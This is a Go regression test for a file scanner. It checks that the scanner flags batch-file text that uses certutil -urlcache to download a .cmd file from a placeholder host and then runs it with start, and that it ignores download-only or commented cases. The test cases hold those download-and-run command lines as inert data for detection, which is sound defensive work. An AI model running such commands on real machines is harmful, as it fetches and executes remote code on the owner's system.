package main

import (
    "os"
    "path/filepath"
    "testing"
)

// Stage 13 certutil regression: inspect inert command text, NEVER execute it.
// A download without launch is legitimate and should not independently alert.
func TestV49CertutilDownloadLaunchRegression(t *testing.T) {
    cases := []struct {
        name string
        source string
        want bool
    }{
        {"legacy-http-same-output", "certutil -urlcache -f http://example.invalid/n.cmd %TEMP%\\review.cmd\nstart %TEMP%\\review.cmd", true},
        {"https-same-output", "certutil -urlcache -split -f https://example.invalid/inert.cmd %TEMP%\\inert.cmd\nstart %TEMP%\\inert.cmd", true},
        {"transfer-only", "certutil -urlcache -f https://example.invalid/docs.txt %TEMP%\\docs.txt", false},
        {"unrelated-file", "certutil -urlcache -f https://example.invalid/inert.cmd %TEMP%\\inert.cmd\nstart %TEMP%\\other.cmd", false},
        {"commented-only", "REM certutil -urlcache -f https://example.invalid/inert.cmd %TEMP%\\inert.cmd\nREM start %TEMP%\\inert.cmd", false},
    }
    for _, tc := range cases {
        t.Run(tc.name, func(t *testing.T) {
            src := []byte(tc.source)
            visible := stage13VisibleSource(tc.source)
            matches := stage13CertutilRemote.FindAllStringSubmatch(visible, 8)
            rawScore := 0
            rawReasons := []string{}
            inspectStage13Content("sample.cmd", ".cmd", src, &rawScore, &rawReasons)
            path := filepath.Join(t.TempDir(), "sample.cmd")
            if err := os.WriteFile(path, src, 0600); err != nil { t.Fatal(err) }
            st, err := os.Stat(path)
            if err != nil { t.Fatal(err) }
            finding := inspectFile(path, st)
            found := finding != nil
            if found != tc.want || (rawScore >= 40) != tc.want {
                t.Fatalf("unexpected result: want=%t full_alert=%t raw_score=%d raw_reasons=%v regex_matches=%v", tc.want, found, rawScore, rawReasons, matches)
            }
        })
    }
}
